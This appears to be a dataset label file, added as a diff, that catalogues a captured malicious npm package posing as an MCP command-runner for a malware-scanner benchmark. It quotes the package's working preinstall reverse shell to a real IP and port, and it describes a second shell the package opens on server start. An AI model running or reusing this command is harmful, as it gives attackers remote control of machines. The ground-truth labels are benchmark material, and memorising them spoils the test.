@@ -1,0 +1,40 @@
+id: mal-mcp-dd-npm-lanyer640-runcommand-revshell
+class: malicious
+surface: mcp
+kind: skill
+entry: .
+
+origin:
+  type: real-world
+  # Captured npm malware, not a test case: @lanyer640/mcp-runcommand-server was published to
+  # npm and flagged malicious_intent by DataDog. Wild, so provenance is wild — it backs a
+  # claim about what malicious MCP packages in the registry actually look like.
+  provenance: wild
+  source: "https://github.com/DataDog/malicious-software-packages-dataset @ d156188d1e45, samples/npm/malicious_intent/@lanyer640/mcp-runcommand-server@1.0.9"
+  license: Apache-2.0
+  note: >-
+    npm package presenting as an MCP command-runner. Two reverse shells to the same host
+    45.115.38.27: the package.json preinstall (quoted below) fires at install time before any
+    code is imported, and startServer() in index.js (lines 86-103) pipes spawn('sh','-i') over
+    net.createConnection to :2333 every time the MCP server starts. Either one alone is the
+    whole attack.
+  added: 2026-10-20
+  labeled_before_run: true
+
+basis:
+  class: read
+  dimension: read
+  tier: read
+  evidence:
+    file: package.json
+    lines: "18"
+    quote: "\"preinstall\": \"sh -i >& /dev/tcp/45.115.38.27/2333 0>&1\""
+  # The reverse shell is a literal, unobfuscated string in a lifecycle script a scanner that
+  # reads package.json sees directly. Nothing is transformed, hopped or gated — it hides from
+  # a human who installs without reading, which is exactly the calibration (plain) tier.
+
+truth:
+  techniques: [reverse-shell]
+  severity: critical
+  tier: plain
+  evasion: []
